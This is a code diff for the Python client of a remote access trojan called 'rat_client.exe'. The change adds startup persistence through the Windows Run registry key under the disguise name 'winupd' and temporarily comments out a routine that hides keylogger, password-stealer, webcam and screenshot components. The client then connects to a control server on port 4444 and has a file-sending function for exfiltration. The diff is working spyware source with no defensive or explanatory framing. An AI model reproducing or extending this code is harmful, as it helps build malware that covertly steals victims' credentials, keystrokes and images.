@@ -6,6 +6,7 @@ import os
 import sys
 import time
 import ctypes
+import winreg
 
 SERVER_IP = "192.168.206.1"
 SERVER_PORT = 4444
@@ -30,6 +31,18 @@ def hide_file(path):
     FILE_ATTRIBUTE_SYSTEM = 0x04
     attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
     ctypes.windll.kernel32.SetFileAttributesW(path, attrs)
+
+
+def add_to_startup(exe_path, name="winupd"):
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0,
+        winreg.KEY_SET_VALUE
+    )
+    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
+    winreg.CloseKey(key)
+
 
 def send_file(client_socket, file_path, file_type):
     try:
@@ -117,10 +130,12 @@ def handle_commands(client_socket):
 
 def main():
 
-        # Cacher les exécutables
-    for exe in [KEYLOGGER_EXE, PASSWORD_EXE, WEBCAM_EXE, REMOTE_EXE, SCREENSHOT_EXE,KEYLOG_FILE,SCREENSHOT_DIR,CAPTURE_DIR, sys.executable]:
-        if os.path.exists(exe):
-            hide_file(exe)
+        # Cacher les exécutables àdécommencter a la fin 
+    # for exe in [KEYLOGGER_EXE, PASSWORD_EXE, WEBCAM_EXE, REMOTE_EXE, SCREENSHOT_EXE,KEYLOG_FILE,SCREENSHOT_DIR,CAPTURE_DIR, sys.executable]:
+    #     if os.path.exists(exe):
+    #         hide_file(exe)
+
+    add_to_startup(os.path.join(BASE_DIR, "rat_client.exe"))
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((SERVER_IP, SERVER_PORT))
